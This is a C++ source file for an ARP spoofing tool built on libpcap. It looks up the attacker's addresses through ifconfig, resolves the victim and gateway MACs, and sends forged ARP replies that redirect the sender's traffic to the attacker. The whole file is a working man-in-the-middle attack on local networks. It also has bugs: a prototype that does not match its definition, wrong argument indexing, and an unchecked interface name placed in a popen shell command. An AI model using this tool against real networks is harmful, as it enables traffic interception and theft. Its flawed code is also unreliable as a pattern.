#include <regex.h>
#include <sys/types.h>

#include <cstdio>
#include <pcap.h>

#include<string.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#define MAX_STR_SIZE 100

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

struct MyAddr final{
  Ip ip_;
  Mac mac_;
};

void usage() {
    printf("syntax: ARPSpoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: ARPSpoofing eth0 192.168.0.4 192.168.0.1\n");
}

MyAddr getAttackerAddr(char *dev);
Mac getMACAddr(char* IP);
void sendARPRequest(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
void sendARPReply(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP,MyAddr attacker);

int main(int argc, char* argv[]) {

    if( argc < 4 || argc % 2 !=0 )
    {
        usage();
        return -1;
    }

    int i;
    int attackCase = 0;

    attackCase = (argc-2) / 2 ;

    MyAddr attacker = getAttackerAddr(argv[1]);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(argv[1],BUFSIZ,1,1,errbuf);

    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }

    for(i=0;i<attackCase;i++)
    {
        arpSpoofing(handle, argv[2+i], argv[3+i],attacker);
    }

    pcap_close(handle);

}

MyAddr getAttackerAddr(char *dev)
{
    FILE *fp = NULL;

    MyAddr attacker;

    char command[MAX_STR_SIZE] = "ifconfig \0";
    strcat(command, dev);

    if((fp = popen(command,"r"))==NULL)
    {
        fprintf(stderr,"Failed to open cmd");
        exit(1);
    }

    char line[MAX_STR_SIZE]="\0";

    const char *regexIP = "(inet )(([2]([0-4][0-9]|[5][0-5])|[0-1]?[0-9]?[0-9])[.]){3}(([2]([0-4][0-9]|[5][0-5])|[0-1]?[0-9]?[0-9]))";
    const char *regexMAC = "(ether )([0-9a-fA-F]{2}[:]){5}[0-9a-fA-F][0-9a-fA-F]";

    regex_t regexComIP, regexComMac;
    regmatch_t matchIP[MAX_STR_SIZE],matchMAC[MAX_STR_SIZE];

    int len=0;
    char mIP[MAX_STR_SIZE], mMAC[MAX_STR_SIZE];
    int fIP=0,fMAC=0;

    if(regcomp(&regexComIP,regexIP,REG_EXTENDED) || regcomp(&regexComMac,regexMAC,REG_EXTENDED))
    {
        fprintf(stderr,"Could not compile regular Expresion.\n");
        exit(1);
    }

    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
    {

        if(fIP==0 && regexec(&regexComIP,line,MAX_STR_SIZE,matchIP,REG_EXTENDED)==0)
        {
            len = matchIP[0].rm_eo-matchIP[0].rm_so;
            strncpy(mIP, line+matchIP[0].rm_so, len);
            mIP[len]='\0';
            attacker.ip_=Ip(mIP+strlen("inet "));
            fIP=1;
            regfree(&regexComIP);
        }

        if(fMAC==0 && regexec(&regexComMac,line,MAX_STR_SIZE,matchMAC,REG_EXTENDED)==0)
        {
            len = matchMAC[0].rm_eo - matchMAC[0].rm_so;
            strncpy(mMAC, line+matchMAC[0].rm_so,len);
            mMAC[len]='\0';
            attacker.mac_=Mac(mMAC+strlen("ether "));
            fMAC=1;
            regfree(&regexComMac);
        }

        if(fIP==1 && fMAC==1)       // ....Why?...
        {
            return attacker;
        }

    }

    printf("Out of While\n");
    regfree(&regexComIP);
    regfree(&regexComMac);

    fprintf(stderr,"We can't find MY Address");
    exit(1);

}

Mac getMACAddr(pcap_t* handle, Ip IP)
{
    while(1)
    {
        struct pcap_pkthdr* hdr;
        const u_char* packet;

        int res = pcap_next_ex(handle, &hdr, &packet);

        if(res==0)   continue;

        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            fprintf(stderr,"pcap_next_ex return %d(%s)\n",res,pcap_geterr(handle));
            exit(1);
        }

        struct EthArpPacket* etharp = (EthArpPacket *)packet;

        if(etharp->eth_.type() == EthHdr::Arp && etharp->arp_.op()==ArpHdr::Reply && etharp->arp_.sip()== IP)
        {
            return etharp->arp_.smac();
        }
    }
}

void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
{
    Ip sIP = Ip(sendIP);
    Ip tIP = Ip(targetIP);
    Ip rIP;

    //0. get MAC addr
    sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
    Mac tMAC = getMACAddr(handle, tIP);
    sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),sIP);
    Mac sMAC = getMACAddr(handle, sIP);

//    //1. sender PC request
//    sendARPRequest(handle, sMAC,Mac::broadcastMac(),sMAC,sIP,Mac::nullMac(),tIP);

//    //2. target PC reply
//    sendARPReply(handle,tMAC,sMAC,tMAC,tIP,sMAC,sIP);

    //3. attacker PC reply
    sendARPReply(handle,attacker.mac_,sMAC,attacker.mac_,tIP,sMAC,sIP);

//    //4. attacker PC request
//    sendARPRequest(handle,attacker.mac_,sMAC,attacker.mac_,tIP,Mac::nullMac(),rIP);

}

void sendARPRequest(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{
    EthArpPacket packet;

    packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),sizeof(EthArpPacket));

    if(res!=0)
    {
        fprintf(stderr,"pcap_sendpacket return %d error = %s\n",res,pcap_geterr(handle));
    }
}

void sendARPReply(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{
    EthArpPacket packet;

    packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),sizeof(EthArpPacket));
    if(res!=0)
    {
        fprintf(stderr,"pcap_sendpacket return %d error = %s\n",res,pcap_geterr(handle));
    }
}

